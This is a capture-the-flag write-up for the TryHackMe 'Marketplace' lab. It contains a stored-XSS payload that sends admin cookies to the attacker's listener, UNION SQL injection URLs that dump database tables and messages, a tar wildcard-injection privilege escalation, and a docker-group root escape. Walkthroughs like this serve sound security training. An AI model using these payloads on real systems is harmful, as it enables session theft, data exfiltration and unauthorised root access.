# TryHackMe - The Marketplace Write Up

## Description

The Marketplace is a boot to root challenge from [TryHackMe](https://tryhackme.com/jr/marketplace).  
The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?



## Machine Deployment

Deploy the machine and connect via OpenVPN to the TryHackMe network.  

Optional: assign the hostname 'thm' to the IP address of the deployed Marketplace box.  

```

$: echo -e "<ip> thm" | sudo tee -a /etc/hosts

```

## Scanning and Enumeration

Performing a service scan with nmap shows three ports are open:  
22 (SSH 7.6p1), 80 (nginx 1.19.2), and 32768 (Node.JS Express Middleware)
```

$: sudo nmap -sV thm

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 11:15 BST
Nmap scan report for thm (10.10.100.40)

Host is up (0.040s latency).

Not shown: 997 filtered ports

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Accessing the website on port 80 brings us to the Marketplace homepage which allows users to register and submit listings.
![Alt text](/The%20Marketplace/img/homepage.png?raw=true "Homepage")

Testing the input fields on the 'login' and 'register' pages for any input validation vulnerabilities yields no results, as too does performing a directory bruteforce using gobuster.

## XSS Cookie Stealing
After signing up for an account, the input fields on the 'New Listing' page where tested.  
The data inserted into the fields are not sanitised which allows for a stored XSS: JavaScript can be inserted into the 'title' and 'description' input fields which is then executed when a user views the submission.

A report button is also present which notifies the administrators of the post for inspection.  
With this in mind, we can submit, and subsequently report, a listing which contains the malicious JS below to steal the cookies of the admins.

```<script>document.location="http://VPNIP:1234/i.php?cookie="+document.cookie</script>```
![Alt text](/The%20Marketplace/img/new_listing.png?raw=true "New submission")


To capture the HTTP request and cookie data we'll setup a netcat listener.  
```nc -lvp 1234```

After the listing has been reported and the admin clicks on the listing the request is captured.  
![Alt text](/The%20Marketplace/img/report_xss.png?raw=true "Cookie stealing via XSS")

With the admin cookie now in possession, we can gain access to the admin account by editing the token value of our cookie.  
This can be achieved using the ```cookie-editor``` Firefox plugin.  
![Alt text](/The%20Marketplace/img/cookie.png?raw=true "Cookie editor")

## SQL Injection within the Administrator Console
After gaining access to the administrator console we are given the ability to view and manage users' accounts and we also see our first flag to answer task #1.

Due to a lack of sanitisation of the 'user' parameter, we are able to perform SQL injection which can be used to exfiltrate data from the MySQL database.
![Alt text](/The%20Marketplace/img/mysql_error.png?raw=true "SQL injection leading to SQL error")

Using the below SQL injection we can list all the tables in the Marketplace DB:

```
http://thm/admin?user=1 and 1=2 union select group_concat(table_name), null, null, null from information_schema.tables where table_schema = database()
```
![Alt text](/The%20Marketplace/img/sqli_tables.png?raw=true "Extracting tables via SQLi")

The tables in this database are:

```
items
messages
users
```

The users table contains username and password hashes (bcrypt) - trying to attack the password hash will take you down a rabbit hole.  
As a rule of thumb on TryHackMe, if you can't bruteforce a password within 5 minutes odds are you are on the wrong track.

Exploring the 'messages' table gives us the information we need: the password to access the account of 'jake'
```
http://thm/admin?user=2 and 1=2 union select group_concat(user_to, message_content), null, null, null from messages
```
![Alt text](/The%20Marketplace/img/messages_password.png?raw=true "Viewing private message with password")

We can now SSH as 'jake' to the server and view our second flag which is in the home directory of the user.

## Privilege Elevation
Executing ```sudo -l``` we can see the user is able to execute a backup script as the user 'michael'

```
jake@the-marketplace:~$ sudo -l
User jake may run the following commands on the-marketplace:
  (michael) NOPASSWD: /opt/backups/backup.sh
```

The script contains the following code:
```
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

Due to the wildcard character used by the tar command, we can exploit this to run any script of our choosing, in our case, opening a shell as 'michael'.
```
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh exec.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1
jake@the-marketplace:/opt/backups$ echo "/bin/bash" > exec.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
michael@the-marketplace:/opt/backups$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```   
![Alt text](/The%20Marketplace/img/priv_esc_michael.png?raw=true "Elevating privileges to michael")

From the above 'id' output, we can see michael is in the 'docker' group which is our way to eleveating our privileges to root.  
Running the below docker command we can mount, as the root user, the root filesystem to /mnt.  
In the home directory of the root user we come across our final flag.

```
michael@the-marketplace:/home/michael$ docker run -it -v /:/mnt nginx chroot /mnt
# id
uid=0(root) gid=0(root) groups=0(root)
```
![Alt text](/The%20Marketplace/img/priv_esc_root.png?raw=true "Elevating privileges to michael")



